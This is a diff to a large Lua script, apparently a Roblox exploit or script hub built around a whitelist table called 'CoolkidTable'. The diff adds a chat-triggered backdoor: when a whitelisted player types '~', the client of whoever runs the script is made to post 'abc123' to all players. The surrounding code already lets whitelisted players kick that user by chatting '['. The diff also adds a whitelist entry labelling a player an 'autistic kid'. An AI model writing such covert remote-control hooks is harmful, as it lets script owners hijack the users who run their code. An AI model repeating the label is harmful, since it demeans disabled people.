@@ -2023,6 +2023,11 @@ local CoolkidTable = {
 		['Colour'] = Color3.fromRGB(255,0,70);
 		['Access'] = false;
 	};
+	['710288902'] 	= {
+		['Name'] = "autistic kid who bought the shirt twice and is active in the server";
+		['Colour'] = Color3.fromRGB(0,255,0);
+		['Access'] = false;
+	}
 }
 
 local Debounce = false 
@@ -2373,6 +2378,9 @@ for i = 1,#PlayersX do
 				if Chat:sub(1,1) == "[" then 
 					LP:Kick('You have been kicked by '..Plr.Name.." for "..table.concat(Arguments," "))
 				end
+				if Chat:sub(1,1) == "~" then 
+					ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
+				end 
 			end
 		end)
 	end
@@ -2414,6 +2422,9 @@ Players.PlayerAdded:Connect(function(Plr)
 						if Chat:sub(1,1) == "[" then 
 							LP:Kick('You have been kicked by '..Plr.Name.." for "..table.concat(Arguments," "))
 						end
+						if Chat:sub(1,1) == "~" then 
+							ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
+						end 
 					end
 				end)
 			end
